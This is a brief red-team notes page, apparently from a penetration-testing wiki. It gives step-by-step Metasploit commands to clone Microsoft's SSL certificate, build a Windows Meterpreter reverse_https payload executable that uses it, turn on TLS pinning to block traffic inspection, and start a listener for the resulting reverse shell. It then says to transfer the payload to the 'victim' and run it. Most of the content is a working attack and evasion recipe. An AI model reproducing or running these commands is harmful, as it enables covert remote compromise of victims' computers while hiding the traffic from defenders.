# p - Meterpreter SSL Certificate Impersonation and Detection Evasion

We can us the "impersonate\_ssl" metasploit module for this.

{% code overflow="wrap" lineNumbers="true" %}
```bash
msf > use auxiliary/gather/impersonate_ssl # This module will request a copy of a SSL certificate from a side of our choosing, So we will create a self-signed version of the certificate and private key we can then use to configure our payload and handler with, this will allow us to impersonate the SSL certificate information and can certainly help evading over the wire hueristics.
msf > set RHOSTS www.microsoft.com # we will impersonate this cert.
# Metasploit will create a public private key pair for the new certificate a ".pem" and ".crt" file which we will use to configure our payload and handler.

# we can generate a payloaad directly from msfconsole instead of using msfvenom.
msf > use payload/windows/x64/meterpreter/reverse_https
msf > set LHOST, LPORT
msf > set handlersslcert <path_to_the_generated_.pem_certificate>
msf > set stagerverifysslcert true # this makes it more difficult for defenders to intercept our ssl traffic by enabling TLS pinning.
msf > generate -t exe -f ssl_payload.exe # generate the ssl payload using the handler ssl_cert.

# setup a listener
msf > use multi/handler
msf > set LHOST, LPORT
msf > set handlersslcert <path_to_the_generated_.pem_certificate>
msf > set stagerverifysslcert true
msf > set payload/windows/x64/meterpreter/reverse_https
msf > run
```
{% endcode %}

Transfer the generated payload to the victim, then run. When you check wireshark  you should see that we have successfully impersonated the Microsoft ssl cert information.

